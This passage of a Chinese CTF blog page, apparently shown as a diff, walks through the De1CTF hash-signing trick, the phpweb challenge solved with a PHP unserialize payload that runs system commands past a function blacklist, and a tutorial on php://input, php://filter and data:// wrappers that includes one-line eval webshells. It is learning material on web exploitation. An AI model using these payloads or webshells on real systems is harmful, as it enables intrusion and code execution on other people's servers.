-<li>param参数不能以gopher或者file开头。</li>
-<li>md5(secret_key+param+action) == sign【我们不知道secret_key】</li>
-<li>action里要有”scan”和”read”</li>
-</ol>
-<h2 id="geneSign"><a href="#geneSign" class="headerlink" title="/geneSign"></a>/geneSign</h2><h3 id="geneSign-函数"><a href="#geneSign-函数" class="headerlink" title="geneSign()函数"></a>geneSign()函数</h3><ol>
-<li>get获取param参数</li>
-<li>action的值是”scan”</li>
-<li>返回getSign(action,param)【相当于md5(secret_key + param + “scan”)】</li>
-</ol>
-<h2 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h2><p>那么，结合两个路由的分析结果，我们知道：</p>
-<ol>
-<li>md5(secret_key + param + action)</li>
-<li>对于/geneSign的路由：geneSign()函数：返回md5(secret_key + param + “scan”)</li>
-<li>对于/De1ta的路由：1：md5(secret_key+param+action) == sign；2：action里要有”scan”和”read”；3.param是flag.txt来读取flag</li>
-</ol>
-<p>那么，我们在/geneSign路由里构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5(secret_key + &quot;flag.txtread&quot; + &quot;scan&quot;)</span><br><span class="line">得到的值到&#x2F;De1ta里相当于</span><br><span class="line">md5(secret_key + &quot;flag.txt&quot; + &quot;readscan&quot;)		&#x2F;&#x2F;即使sign的值和&#x2F;geneSign里返回的值一致</span><br></pre></td></tr></table></figure>
-
-
-
-<p>总结一下，就是：</p>
-<ol>
-<li>在/geneSign里构造：param=flag.txtread，得到返回值res</li>
-<li>在/De1ta里构造：param=flag.txt、action=readscan、sign=res</li>
-</ol>
-<h2 id="md5扩展攻击解法"><a href="#md5扩展攻击解法" class="headerlink" title="md5扩展攻击解法"></a>md5扩展攻击解法</h2><p>先了解一下<a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">hash扩展攻击原理</a></p>
-<p>使用场景：</p>
-<p>当我们知道md5(key + var1)的值和key的长度</p>
-<p>我们就可以求md5(key + var1 + 第一次填充 + var2)的值</p>
-<p>方法是把md5(key + var1)作为第二次运算的初始向量</p>
-<p>详情见<a href="https://blog.csdn.net/qq_35078631/article/details/70941204" target="_blank" rel="noopener">文章</a></p>
-<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>进去页面先看到这个</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form  id=form1 name=form1 action=<span class="string">"index.php"</span> method=post&gt;</span><br><span class="line">    &lt;input type=hidden id=func name=func value=<span class="string">'date'</span>&gt;</span><br><span class="line">    &lt;input type=hidden id=p name=p value=<span class="string">'Y-m-d h:i:s a'</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<p>试着POST上传这两个参数，发现出现以下报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 24</span><br><span class="line">2021-01-23 03:59:56 pm</span><br></pre></td></tr></table></figure>
-
-<p>考虑这两个参数会不会一个代表函数，一个代表函数的参数。</p>
-<p>尝试POST上传</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;system&amp;p&#x3D;ls</span><br></pre></td></tr></table></figure>
-
-<p>直接出了HACKER…证明猜测问题不大，但是应该过滤了一些危险函数。</p>
-<p>于是尝试能不能读出源代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;file_get_contents&amp;p&#x3D;index.php</span><br></pre></td></tr></table></figure>
-
-<p>还真读到了源代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>看到那个Test类的<strong>__</strong>destruct，想到和反序列化有关，想到先用反序列化和最后那个gettime搞出Test对象，再利用destruct里的gettime点来实现爆flag</p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/7-1.png" alt="7-1"></p>
-<p>上传POST数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:25:&quot;cat $(find &#x2F; -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>于是爆出来flag</p>
-<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最后一步试着写一个python脚本爬虫来爆出flag</p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/07/29/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">php伪协议</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-07-29</time><div class="content"><h1 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h1><p>简单来说好像就是获取POST的数据，具体的还是来看实例吧</p>
-<h2 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$d = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">	@<span class="keyword">eval</span>($d);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>测试截图</p>
-<p><img src="/2020/07/29/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/input1.png" alt="input1"></p>
-<h2 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @include($_GET[&#39;file&#39;]); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>测试截图</p>
-<p><img src="/2020/07/29/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/input2.png" alt="input2"></p>
-<h2 id="实例3（一句话木马）"><a href="#实例3（一句话木马）" class="headerlink" title="实例3（一句话木马）"></a>实例3（一句话木马）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @include($_GET[&#39;file&#39;]); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>测试截图：</p>
-<p><img src="/2020/07/29/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/input3.png" alt="input3"></p>
-<h1 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h1><p>简单来说就是获取源代码的方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;fakePro&#x2F;input2.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;shell.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/07/29/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/filter1.png" alt="filter1"></p>
-<p>该串编码base64解码之后就是，即shell.php内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&quot;ag&quot;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>注：input2.php只充当作为地址基址的作用，使用同一目录下的input1.php也可以</p>
-</blockquote>
-<h1 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br></pre></td></tr></table></figure>
-
-<p>相当于要上传一个text的文件并且内容是welcome to the zjctf</p>
-<p>于是payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>
-
-<p>但是一般需要绕过那么就构造base64编码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
-
-<p>附上manual里的使用范例:</p>
-<p><img src="/2020/07/29/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/data.png" alt="data"></p>
 </div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
